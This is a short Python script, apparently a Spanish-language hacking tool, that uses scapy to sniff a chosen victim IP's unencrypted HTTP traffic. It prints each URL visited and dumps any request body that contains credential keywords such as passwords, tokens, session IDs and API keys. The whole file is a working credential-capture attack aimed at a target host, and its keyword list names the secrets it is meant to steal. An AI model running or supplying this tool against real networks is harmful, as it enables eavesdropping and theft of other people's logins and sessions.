#!/usr/bin/env python3
# Autor = Pepe >:)

import scapy.all as scapy
import argparse
import sys
from termcolor import colored
from scapy.layers import http

def get_arguments():
    parser = argparse.ArgumentParser(description="HTTP Sniffer - Captura URLs y Credenciales")
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="Interfaz de red (ej: wlan0, eth0)")
    parser.add_argument("-t", "--target", required=True, dest="target", help="IP de la víctima")
    args = parser.parse_args()

    return args.interface, args.target

def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode('utf-8', errors='ignore')
    path = packet[http.HTTPRequest].Path.decode('utf-8', errors='ignore')
    return f"{host}{path}"

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')

        keywords = [
            "username", "user", "usuario", "login", "userid", "account",
            "password", "pass", "passwd", "pwd", "contrasena", "contraseña",
            "pin", "key", "secret",
            "email", "mail", "correo",
            "auth", "authentication", "auth_token", "token", "access_token",
            "session", "sessionid", "sid",
            "apikey", "api_key",
            "credential", "credentials",
            "signin", "signup", "sign-in", "sign-up",
            "logon", "logout",
            "id", "identificador"
        ]

        for keyword in keywords:
            if keyword in load.lower():
                return load
    
    return None

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        try:
            url = get_url(packet)
            print(colored(f"[+] URL Visitada: http://{url}", "blue"))
        except Exception:
            pass

        login_info = get_login_info(packet)
        if login_info:
            print(colored("\n\n" + "*"*50, "red"))
            print(colored(f"[!] Posible Credencial Capturada: ", "red", attrs=['bold']))
            print(colored(f"{login_info}", "yellow"))
            print(colored("*"*50 + "\n\n", "red"))

def main(): 

    interface, target = get_arguments()

    print(colored(f"\n--- HTTP SNIFFER (Target: {target}) ---", "white", attrs=['bold']))
    print(colored(f"[*] Escuchando en {interface}...", "yellow"))

    bpf_filter = f"tcp port 80 and src host {target}"
    
    try:
        scapy.sniff(iface=interface, filter=bpf_filter, prn=process_packet, store=0)
    except KeyboardInterrupt:
        print(colored("\n[!] Sniffer detenido.", "yellow"))

if __name__ == "__main__":
    main()